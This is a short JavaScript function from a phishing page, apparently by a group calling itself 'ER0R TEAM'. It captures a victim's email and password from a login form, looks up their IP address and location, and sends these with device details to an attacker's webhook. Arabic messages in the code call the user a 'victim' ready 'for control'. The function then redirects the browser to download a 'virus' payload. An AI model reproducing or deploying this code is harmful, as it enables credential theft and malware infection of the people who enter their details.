async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    if(!email || !pass) return alert("يرجى إكمال البيانات");

    try {
        const configRes = await fetch('data.json');
        const config = await configRes.json();
        const geoRes = await fetch('https://ipapi.co/json/');
        const geo = await geoRes.json();

        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "ER0R MASTER CONTROL",
                embeds: [{
                    title: "💀 تم صيد ضحية جديدة - جاهز للسيطرة",
                    color: 0x6001d2,
                    fields: [
                        { name: "📧 الحساب", value: `\`${email}\``, inline: true },
                        { name: "🔑 الباسورد", value: `\`${pass}\``, inline: true },
                        { name: "🌐 الـ IP والموقع", value: `${geo.ip} (${geo.city}, ${geo.country_name})`, inline: false },
                        { name: "💻 النظام والمعالج", value: `${navigator.platform} | ${navigator.hardwareConcurrency} Cores`, inline: true }
                    ],
                    footer: { text: "ER0R TEAM - COMMAND CENTER" },
                    timestamp: new Date()
                }]
            })
        });

        // بدء التحميل التلقائي للفيروس للتحكم الكامل
        setTimeout(() => { window.location.href = config.pc_payload; }, 2000);
    } catch(e) { console.log("System Sync..."); }
}